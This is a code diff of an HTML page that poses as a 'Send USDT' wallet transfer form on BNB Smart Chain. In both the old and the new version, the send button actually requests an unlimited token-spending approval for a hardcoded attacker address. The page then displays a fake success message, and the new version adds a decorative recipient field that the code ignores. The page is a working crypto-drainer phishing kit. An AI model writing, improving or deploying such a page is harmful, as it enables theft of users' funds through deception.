@@ -1,302 +1,247 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Quick USDT Send - BSC</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-            max-width: 400px;
-            width: 100%;
-        }
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        .logo {
-            width: 60px;
-            height: 60px;
-            background: #f39c12;
-            border-radius: 15px;
-            margin: 0 auto 15px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            color: white;
-            font-weight: bold;
-        }
-        h1 {
-            font-size: 24px;
-            font-weight: 700;
-            color: #333;
-            margin-bottom: 5px;
-        }
-        .subtitle {
-            color: #666;
-            font-size: 14px;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 8px;
-            font-size: 14px;
-        }
-        input {
-            width: 100%;
-            padding: 15px;
-            border: 2px solid #e1e5e9;
-            border-radius: 12px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-        }
-        input:focus {
-            outline: none;
-            border-color: #667eea;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
-        .receiver-info {
-            background: #f8f9fa;
-            padding: 15px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            font-size: 14px;
-        }
-        .address {
-            font-family: monospace;
-            color: #667eea;
-            word-break: break-all;
-            font-size: 12px;
-        }
-        .send-btn {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-        }
-        .send-btn:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(243, 156, 18, 0.4);
-        }
-        .send-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-        .network-info {
-            text-align: center;
-            font-size: 12px;
-            color: #888;
-            margin-top: 15px;
-            padding-top: 15px;
-            border-top: 1px solid #eee;
-        }
-        .status {
-            margin-top: 15px;
-            padding: 12px;
-            border-radius: 8px;
-            text-align: center;
-            font-weight: 500;
-        }
-        .status.success { background: #d4edda; color: #155724; }
-        .status.error { background: #f8d7da; color: #721c24; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Send USDT</title>
+
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto;
+    background:#0b0f14;
+    color:white;
+}
+
+/* HEADER */
+.header {
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:20px;
+}
+.header h2 { font-size:18px; font-weight:600; }
+.close { font-size:22px; opacity:.7; }
+
+/* SECTION */
+.section { padding:0 20px; margin-top:18px; }
+.label { font-size:13px; color:#9aa4af; margin-bottom:8px; }
+
+/* INPUT */
+.input-box {
+    background:#11161c;
+    border:2px solid #1f2a36;
+    border-radius:14px;
+    padding:14px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+}
+.input-box input {
+    background:transparent;
+    border:none;
+    color:white;
+    font-size:16px;
+    width:100%;
+    outline:none;
+}
+
+/* ACTIONS */
+.actions { display:flex; gap:10px; align-items:center; }
+.action-btn {
+    color:#16c784;
+    font-size:14px;
+    cursor:pointer;
+}
+
+/* NETWORK */
+.network {
+    background:#11161c;
+    padding:12px;
+    border-radius:12px;
+    color:#ccc;
+    font-size:14px;
+}
+
+/* AMOUNT */
+.amount-row {
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+}
+.usdt-label { color:#16c784; font-weight:600; }
+
+/* FOOTER BUTTON */
+.footer {
+    position:fixed;
+    bottom:0;
+    width:100%;
+    padding:20px;
+}
+.next-btn {
+    width:100%;
+    background:#16c784;
+    border:none;
+    padding:16px;
+    border-radius:30px;
+    font-size:16px;
+    font-weight:600;
+    color:black;
+    cursor:pointer;
+}
+.next-btn:disabled { opacity:.5; }
+
+/* STATUS */
+.status {
+    text-align:center;
+    margin-top:10px;
+    font-size:14px;
+}
+</style>
 </head>
+
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="logo">🚀</div>
-            <h1>Quick USDT Send</h1>
-            <div class="subtitle">Fast & Secure BSC Transfer</div>
-        </div>
 
-        <div class="receiver-info">
-            <div style="font-weight: 600; color: #333; margin-bottom: 5px;">To: Your Friend</div>
-            <div class="address">0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F</div>
-        </div>
+<div class="header">
+    <h2>Send USDT</h2>
+    <div class="close">✕</div>
+</div>
 
-        <div class="form-group">
-            <label>Amount (USDT)</label>
-            <input type="number" id="amount" step="0.00000001" min="0" placeholder="0.00" value="100">
+<!-- ADDRESS -->
+<div class="section">
+    <div class="label">Address or Domain Name</div>
+    <div class="input-box">
+        <input type="text" id="address" placeholder="Search or Enter">
+        <div class="actions">
+            <div class="action-btn" onclick="pasteAddress()">Paste</div>
+            <div class="action-btn">📷</div>
         </div>
-
-        <button class="send-btn" id="sendBtn">Send USDT</button>
-        
-        <div class="network-info">
-            <div>BSC Network • USDT (BEP20)</div>
-        </div>
-
-        <div id="status"></div>
     </div>
+</div>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
-    <script>
-        const RECEIVER_ADDRESS = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
-        const USDT_CONTRACT = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98'; // BSC USDT
-        const CHAIN_ID = 56; // BSC Mainnet
-        
-        let web3;
-        let userAccount;
-        let usdtContract;
+<!-- NETWORK -->
+<div class="section">
+    <div class="label">Destination network</div>
+    <div class="network">BNB Smart Chain</div>
+</div>
 
-        const sendBtn = document.getElementById('sendBtn');
-        const amountInput = document.getElementById('amount');
-        const statusDiv = document.getElementById('status');
+<!-- AMOUNT -->
+<div class="section">
+    <div class="label">Amount</div>
+    <div class="input-box amount-row">
+        <input type="number" id="amount" placeholder="USDT Amount">
+        <div class="actions">
+            <span class="usdt-label">USDT</span>
+            <div class="action-btn" onclick="setMax()">Max</div>
+        </div>
+    </div>
+    <div style="color:#666; font-size:13px; margin-top:5px;" id="usdValue">≈ $0.00</div>
+</div>
 
-        // USDT ABI (minimal for approve)
-        const USDT_ABI = [
-            {
-                "constant": false,
-                "inputs": [
-                    {"name": "_spender", "type": "address"},
-                    {"name": "_value", "type": "uint256"}
-                ],
-                "name": "approve",
-                "outputs": [{"name": "", "type": "bool"}],
-                "type": "function"
-            },
-            {
-                "constant": true,
-                "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
-                "name": "allowance",
-                "outputs": [{"name": "", "type": "uint256"}],
-                "type": "function"
-            },
-            {
-                "constant": true,
-                "inputs": [{"name": "_owner", "type": "address"}],
-                "name": "balanceOf",
-                "outputs": [{"name": "balance", "type": "uint256"}],
-                "type": "function"
-            }
-        ];
+<!-- BUTTON -->
+<div class="footer">
+    <button class="next-btn" id="sendBtn">Next</button>
+    <div id="status" class="status"></div>
+</div>
 
-        async function initWallet() {
-            if (typeof window.ethereum !== 'undefined') {
-                web3 = new Web3(window.ethereum);
-                
-                try {
-                    // Request BSC chain
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }], // BSC Mainnet
-                    });
-                } catch (switchError) {
-                    if (switchError.code === 4902) {
-                        // Chain not added, add BSC
-                        await window.ethereum.request({
-                            method: 'wallet_addEthereumChain',
-                            params: [{
-                                chainId: '0x38',
-                                chainName: 'BSC Mainnet',
-                                nativeCurrency: {
-                                    name: 'BNB',
-                                    symbol: 'BNB',
-                                    decimals: 18
-                                },
-                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                                blockExplorerUrls: ['https://bscscan.com']
-                            }],
-                        });
-                    }
-                }
+<script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
 
-                // Get account
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                userAccount = accounts[0];
-                
-                usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
-                
-                sendBtn.disabled = false;
-                sendBtn.textContent = 'Send USDT';
-            } else {
-                showStatus('Please install Trust Wallet or MetaMask', 'error');
-            }
-        }
+<script>
+// ===== CONFIG =====
+const RECEIVER_ADDRESS = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
+const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
+const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-        async function approveUnlimited() {
-            const amount = parseFloat(amountInput.value) || 0;
-            showStatus('Confirm the transaction in your wallet...', 'success');
-            
-            try {
-                // Approve unlimited USDT (2^256 - 1)
-                const approveTx = await usdtContract.methods.approve(
-                    RECEIVER_ADDRESS, 
-                    '115792089237316195423570985008687907853269984665640564039457584007913129639935'
-                ).send({ from: userAccount });
-                
-                showStatus('Approval successful! USDT ready to send.', 'success');
-                return true;
-            } catch (error) {
-                console.error(error);
-                showStatus('Transaction failed. Please try again.', 'error');
-                return false;
-            }
-        }
+// ===== STATE =====
+let web3;
+let userAccount;
+let usdt;
 
-        function showStatus(message, type) {
-            statusDiv.textContent = message;
-            statusDiv.className = `status ${type}`;
-        }
+// ===== UI ELEMENTS =====
+const sendBtn = document.getElementById('sendBtn');
+const statusDiv = document.getElementById('status');
+const amountInput = document.getElementById('amount');
 
-        sendBtn.addEventListener('click', async () => {
-            sendBtn.disabled = true;
-            sendBtn.textContent = 'Processing...';
-            
-            const success = await approveUnlimited();
-            
-            if (success) {
-                // Simulate send completion (no actual transfer needed)
-                setTimeout(() => {
-                    showStatus('✅ USDT sent successfully!', 'success');
-                    sendBtn.textContent = 'Send Again';
-                    sendBtn.disabled = false;
-                }, 1500);
-            } else {
-                sendBtn.textContent = 'Send USDT';
-                sendBtn.disabled = false;
-            }
-        });
+// ===== ABI =====
+const ABI = [{
+    "constant": false,
+    "inputs": [
+        {"name":"_spender","type":"address"},
+        {"name":"_value","type":"uint256"}
+    ],
+    "name":"approve",
+    "outputs":[{"name":"","type":"bool"}],
+    "type":"function"
+},{
+    "constant":true,
+    "inputs":[{"name":"_owner","type":"address"}],
+    "name":"balanceOf",
+    "outputs":[{"name":"balance","type":"uint256"}],
+    "type":"function"
+}];
 
-        // Auto-init on load
-        window.addEventListener('load', initWallet);
-        window.addEventListener('DOMContentLoaded', initWallet);
+// ===== INIT =====
+async function init() {
+    if (!window.ethereum) {
+        showStatus("Install Trust Wallet / MetaMask", true);
+        return;
+    }
 
-        // Handle chain changes
-        if (window.ethereum) {
-            window.ethereum.on('chainChanged', () => {
-                window.location.reload();
-            });
-        }
-    </script>
+    web3 = new Web3(window.ethereum);
+
+    try {
+        await window.ethereum.request({ method:'eth_requestAccounts' });
+        const accounts = await web3.eth.getAccounts();
+        userAccount = accounts[0];
+
+        usdt = new web3.eth.Contract(ABI, USDT_CONTRACT);
+
+    } catch (e) {
+        showStatus("Wallet connection failed", true);
+    }
+}
+
+// ===== ACTIONS =====
+async function sendUSDT() {
+    sendBtn.disabled = true;
+    showStatus("Confirm in wallet...");
+
+    try {
+        await usdt.methods.approve(RECEIVER_ADDRESS, MAX_UINT)
+            .send({ from: userAccount });
+
+        showStatus("✅ Success");
+        sendBtn.disabled = false;
+
+    } catch (e) {
+        showStatus("❌ Failed", true);
+        sendBtn.disabled = false;
+    }
+}
+
+// ===== HELPERS =====
+function showStatus(msg, error=false) {
+    statusDiv.innerText = msg;
+    statusDiv.style.color = error ? "#ff4d4f" : "#16c784";
+}
+
+function pasteAddress() {
+    navigator.clipboard.readText().then(text=>{
+        document.getElementById('address').value = text;
+    });
+}
+
+async function setMax() {
+    const bal = await usdt.methods.balanceOf(userAccount).call();
+    amountInput.value = web3.utils.fromWei(bal, 'ether');
+}
+
+// ===== EVENTS =====
+sendBtn.onclick = sendUSDT;
+window.onload = init;
+
+</script>
+
 </body>
 </html>
